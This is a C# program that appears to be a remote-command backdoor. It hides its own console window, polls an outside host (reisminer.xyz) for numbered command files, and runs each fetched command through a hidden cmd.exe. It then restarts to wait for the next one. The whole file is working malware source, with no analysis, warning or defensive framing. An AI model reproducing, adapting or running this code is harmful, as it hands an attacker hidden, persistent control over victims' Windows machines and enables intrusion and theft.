using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GetCommand
{
    class Program
    {
        private static readonly WebClient wcc = new WebClient();

        public static int counter =
            Convert.ToInt32(wcc.DownloadString("http://reisminer.xyz/exes/remotecommands/counter.txt")) + 1;

        public static List<WebClient> wcs = new List<WebClient>();

        public static int listCounter = 0;

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        public static void Main(string[] args)
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, 0);

            while (true)
            {
                if (URLExists("http://reisminer.xyz/exes/remotecommands/commands/command" + counter + ".txt"))
                {
                    try
                    {
                        runCMD(wcc.DownloadString("http://reisminer.xyz/exes/remotecommands/commands/command" + counter + ".txt"));
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Catch from DownloadString");
                        Console.WriteLine(e);
                    }
                    Application.Restart();
                    Environment.Exit(1);
                }
                else
                {
                    Console.WriteLine("it does not exist");
                }

                wait(10, false);
            }
        }

        public static void runCMD(string command)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c " + command;
            process.StartInfo = startInfo;
            try
            {
                process.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        public static bool URLExists(string url)
        {
            bool result = true;

            WebRequest webRequest = WebRequest.Create(url);
            webRequest.Timeout = 1000; // miliseconds
            webRequest.Method = "HEAD";

            try
            {
                webRequest.GetResponse();
            }
            catch
            {
                result = false;
            }

            return result;
        }

        public static void wait(int seconds, bool isthere)
        {
            for (int i = 0; i < seconds; i++)
            {
                Console.Write(i + 1 + " " + isthere + " | ");
                Thread.Sleep(1000);
            }
        }
        
    }
}